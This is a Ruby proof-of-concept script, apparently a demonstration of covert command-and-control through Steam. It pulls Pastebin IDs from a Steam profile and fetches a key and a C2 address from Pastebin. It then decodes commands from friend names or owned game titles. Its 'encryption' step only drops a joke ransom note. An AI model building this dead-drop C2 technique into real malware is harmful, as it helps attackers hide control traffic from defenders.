#!/usr/bin/ruby
#Libraries
require 'steam_web_api'
require 'net/http'
require 'uri'
require 'colorize'

# !!! API Key Required !!!
client_id = ""      #Steam ID
client_secret = ""  #Steam API Key

#Method: Search by friends or games.
method = "friends"
#method = "games"

#Attack Routine
puts "Attempting to connect to Steam...".light_blue
puts "Using method: #{method}".light_blue
SteamWebApi.configure { |config| config.api_key = client_secret }
player = SteamWebApi::Player.new(client_id)
puts "Searching for tainted user...".light_blue
puts "Found tainted user: #{player.summary.profile['personaname']}".light_red
puts "Found Pastebin Clue: #{player.summary.profile['realname'].split(" ")[0]}. Searching for encryption key there...".light_yellow
uri = URI.parse("https://pastebin.com/raw/#{player.summary.profile['realname'].split(" ")[0]}")
response = Net::HTTP.get_response(uri)
key = response.body
puts "Found Key: #{key}".light_red
puts "Found Pastebin Clue: #{player.summary.profile['realname'].split(" ")[1]}. Searching for C2 IP there...".light_yellow
uri = URI.parse("https://pastebin.com/raw/#{player.summary.profile['realname'].split(" ")[1]}")
response = Net::HTTP.get_response(uri)
c2 = response.body
puts "Found C2: #{c2}".light_red
puts "Reading commands..."
commands = []
if method == "friends"
    data = player.friends
    data.friends.each do |friend|
        my_friend = SteamWebApi::Player.summary(friend['steamid'])
        commands.push(my_friend.players.first['personaname'])
    end
    #command_identifiers = ["SEQ_START",          "set_key",   "leak_info", "crypt_start", "SEQ_END"]
    command_identifiers =  ["santipproducciones", "Loladrone", "Adan_zKx",  "larm182",     "karmendibattista"]
    commands.each do |command|
        if command.match?(Regexp.union(command_identifiers))
            order =  command.to_s
            case order
            when /santipproducciones/
                puts "Received SEQ_START".light_blue
                puts "Identified C2: #{c2}".light_blue
            when /Loladrone/
                puts "Recovered Key: #{key}".light_yellow
            when /Adan_zKx/
                puts "No information to leak. Host will not be enrolled.".light_blue
            when /larm182/
                puts "Starting encryption cycle...".light_red
                begin
                    desktop = ""
                    if Dir.exist?(File.expand_path('~') + "/Desktop")
                        desktop = "#{File.expand_path('~')}/Desktop"
                    elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                        desktop = "#{File.expand_path('~')}/Escritorio"
                    else
                        desktop = "/tmp"
                    end
                    File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                    ""
                rescue => e
                    puts "Exception: #{e}"
                    "Error: Failed to run supplied command."
                end
            when /karmendibattista/
                puts "Received SEQ_END".light_blue
            else
                "Bad Response"
            end
        end
    end
else
    data = player.owned_games(include_appinfo: true)
    data.games.each do |game|
        commands.push(game['name'])
    end
    #command_identifiers = ["SEQ_START",          "set_key",   "leak_info", "crypt_start", "SEQ_END"]
    command_identifiers =  ["Warhammer 40,000: Space Marine", "LEGO® The Lord of the Rings™", "Kingdom Rush", "Darkest Dungeon®", "Warhammer 40,000: Kill Team"]
    commands.each do |command|
        if command.match?(Regexp.union(command_identifiers))
            order =  command.to_s
            case order
            when /Space Marine/
                puts "Received SEQ_START".light_blue
                puts "Identified C2: #{c2}".light_blue
            when /Lord of the Rings/
                puts "Recovered Key: #{key}".light_yellow
            when /Kingdom Rush/
                puts "No information to leak. Host will not be enrolled.".light_blue
            when /Darkest Dungeon/
                puts "Starting encryption cycle...".light_red
                begin
                    desktop = ""
                    if Dir.exist?(File.expand_path('~') + "/Desktop")
                        desktop = "#{File.expand_path('~')}/Desktop"
                    elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                        desktop = "#{File.expand_path('~')}/Escritorio"
                    else
                        desktop = "/tmp"
                    end
                    File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                    ""
                rescue => e
                    puts "Exception: #{e}"
                    "Error: Failed to run supplied command."
                end
            when /Kill Team/
                puts "Received SEQ_END".light_blue
            else
                "Bad Response"
            end
        end
    end
end